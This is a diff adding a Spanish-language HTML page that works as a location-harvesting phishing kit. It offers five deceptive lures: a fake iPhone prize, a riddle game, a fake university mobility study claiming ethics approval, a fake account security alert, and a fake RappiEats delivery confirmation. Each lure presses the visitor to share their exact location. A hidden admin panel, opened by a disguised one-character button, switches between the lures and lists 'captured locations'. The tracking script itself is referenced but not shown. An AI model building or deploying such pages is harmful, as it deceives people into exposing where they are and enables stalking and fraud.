@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 ¡Felicitaciones! Has Ganado un Premio</title>
+    <link rel="stylesheet" href="styles-stealth.css">
+</head>
+<body>
+    <div class="container">
+        <!-- MODO 1: Premio Falso -->
+        <div class="prize-section" id="prizeMode">
+            <header class="prize-header">
+                <h1>🎉 ¡FELICITACIONES! 🎁</h1>
+                <p>Has sido seleccionado para ganar un <strong>iPhone 15 Pro</strong></p>
+                <div class="prize-image">📱✨</div>
+            </header>
+            
+            <div class="prize-content">
+                <h3>🎯 Para reclamar tu premio:</h3>
+                <ol>
+                    <li>✅ Verifica que estes en la ubicación correcta</li>
+                    <li>🎁 Recibe tu premio instantáneamente</li>
+                    <li>📸 Comparte en redes sociales (opcional)</li>
+                </ol>
+                
+                <div class="verification-box">
+                    <h4>🔍 Verificación de Ubicación</h4>
+                    <p>Para evitar fraudes, necesitamos verificar tu ubicación actual</p>
+                    <button id="verifyLocationBtn" class="prize-btn">
+                        🔒 Verificar Ubicación y Reclamar Premio
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- MODO 2: Juego/Quiz -->
+        <div class="game-section" id="gameMode" style="display: none;">
+            <header class="game-header">
+                <h1>🎮 Desafío de Ubicación Secreta</h1>
+                <p>¿Puedes resolver este acertijo geográfico?</p>
+            </header>
+            
+            <div class="game-content">
+                <div class="riddle-box">
+                    <h3>🧩 Acertijo:</h3>
+                    <p class="riddle-text">
+                        "En el lugar donde te encuentras ahora,<br>
+                        las coordenadas guardan un poder especial.<br>
+                        Comparte tu ubicación y descubre<br>
+                        el mensaje oculto en tu posición actual."
+                    </p>
+                </div>
+                
+                <button id="solveRiddleBtn" class="game-btn">
+                    🗺️ Resolver Acertijo con Mi Ubicación
+                </button>
+            </div>
+        </div>
+
+        <!-- MODO 3: Encuesta/Investigación -->
+        <div class="survey-section" id="surveyMode" style="display: none;">
+            <header class="survey-header">
+                <h1>📊 Investigación Académica</h1>
+                <p>Universidad Nacional - Facultad de Geografía</p>
+            </header>
+            
+            <div class="survey-content">
+                <h3>📋 Estudio: "Patrones de Movilidad Urbana"</h3>
+                <p>Estamos realizando un estudio sobre patrones de ubicación para mejorar el transporte público.</p>
+                
+                <div class="academic-box">
+                    <h4>🎓 Participación Anónima</h4>
+                    <p>• Tu identidad permanecerá anónima</p>
+                    <p>• Solo necesitamos tu ubicación actual</p>
+                    <p>• Contribuyes a la investigación científica</p>
+                    <p>• El estudio ha sido aprobado por el comité de ética</p>
+                </div>
+                
+                <button id="participateBtn" class="survey-btn">
+                    🔬 Participar en el Estudio
+                </button>
+            </div>
+        </div>
+
+        <!-- MODO 4: Alerta de Seguridad -->
+        <div class="security-section" id="securityMode" style="display: none;">
+            <header class="security-header">
+                <h1>⚠️ ALERTA DE SEGURIDAD</h1>
+                <p>Sistema de Verificación de Identidad</p>
+            </header>
+            
+            <div class="security-content">
+                <div class="alert-box">
+                    <h3>🛡️ Verificación Requerida</h3>
+                    <p>Hemos detectado actividad inusual en tu cuenta.</p>
+                    <p>Para proteger tu seguridad, necesitamos verificar tu ubicación actual.</p>
+                </div>
+                
+                <div class="security-steps">
+                    <h4>📋 Proceso de Verificación:</h4>
+                    <ol>
+                        <li>🔍 Verificar ubicación actual</li>
+                        <li>✅ Confirmar identidad</li>
+                        <li>🔒 Restaurar acceso completo</li>
+                    </ol>
+                </div>
+                
+                <button id="securityVerifyBtn" class="security-btn">
+                    🔐 Verificar Ubicación Ahora
+                </button>
+            </div>
+        </div>
+
+        <!-- MODO 5: Delivery/Comida -->
+        <div class="delivery-section" id="deliveryMode" style="display: none;">
+            <header class="delivery-header">
+                <h1>🍕 RappiEats Express</h1>
+                <p>Tu pedido está en camino</p>
+            </header>
+            
+            <div class="delivery-content">
+                <div class="order-box">
+                    <h3>📦 Pedido #RE2024-789</h3>
+                    <p><strong>Pizza Hawaiana Familiar</strong></p>
+                    <p><strong>Total:</strong> $25.000 COP</p>
+                    <p><strong>Estado:</strong> 🚴‍♂️ El repartidor está cerca</p>
+                </div>
+                
+                <div class="delivery-alert">
+                    <h4>📍 Confirmación de Dirección</h4>
+                    <p>El repartidor necesita confirmar tu ubicación exacta para la entrega.</p>
+                    <p>Tiempo estimado: <strong>5 minutos</strong></p>
+                </div>
+                
+                <button id="confirmDeliveryBtn" class="delivery-btn">
+                    📍 Confirmar Mi Ubicación para Entrega
+                </button>
+            </div>
+        </div>
+
+        <!-- Panel de Control (Oculto) -->
+        <div class="admin-panel" id="adminPanel" style="display: none;">
+            <h3>🕵️‍♂️ Panel de Control</h3>
+            <div class="mode-selector">
+                <button onclick="switchMode('prize')">🎁 Premio</button>
+                <button onclick="switchMode('game')">🎮 Juego</button>
+                <button onclick="switchMode('survey')">📊 Encuesta</button>
+                <button onclick="switchMode('security')">⚠️ Seguridad</button>
+                <button onclick="switchMode('delivery')">🍕 Delivery</button>
+            </div>
+            <div class="captured-locations" id="capturedLocations">
+                <h4>📍 Ubicaciones Capturadas:</h4>
+                <div id="locationsList"></div>
+            </div>
+        </div>
+
+        <!-- Botón secreto para admin -->
+        <div class="secret-access" onclick="toggleAdmin()" title="Admin">.</div>
+    </div>
+
+    <script src="script-stealth.js"></script>
+</body>
+</html>
